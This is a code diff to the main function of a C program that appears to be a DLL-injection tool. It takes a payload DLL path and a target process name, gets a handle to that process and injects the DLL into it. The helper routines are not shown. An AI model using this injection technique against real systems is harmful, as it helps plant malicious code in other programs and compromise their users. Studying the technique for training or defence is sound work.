@@ -112,12 +112,43 @@ _EndOfFunction:
 int main(int argc, char* argv[]) {
 
 	// Get Command Line Arguments
-	if (argc < 2) {
+	if (argc < 3) {
 		printf("[!] Missing Argument; Usage: <Complete Path to Dll File> <Target Process Name>\n");
 		return -1;
 	}
 
 	printf("[*] Using Dll Payload: %s\n", argv[1]);
+	printf("[*] Target Process Name: %s\n", argv[2]);
+
+	// Convert command line arguments to wide strings
+	wchar_t szDllPath[MAX_PATH];
+	mbstowcs(szDllPath, argv[1], MAX_PATH);
+
+	wchar_t szProcessName[MAX_PATH];
+	mbstowcs(szProcessName, argv[2], MAX_PATH);
+
+	DWORD dwProcessID;
+	HANDLE hProcess;
+
+	// Get the handle of the target remote process
+	if (!GetRemoteProcessHandle(szProcessName, &dwProcessID, &hProcess)) {
+		printf("[!] Failed to get handle of the target process\n");
+		return -1;
+	}
+
+	printf("[*] Got handle of the target process with PID: %d\n", dwProcessID);
+
+	// Inject the DLL into the remote process
+	if (!InjectDllToRemoteProcess(hProcess, szDllPath)) {
+		printf("[!] Failed to inject DLL into the target process\n");
+		CloseHandle(hProcess);
+		return -1;
+	}
+
+	printf("[+] DLL injected successfully\n");
+
+	// Close the handle to the process
+	CloseHandle(hProcess);
 
 	//End
 	printf("[#] Press Any Key To Exit\n");
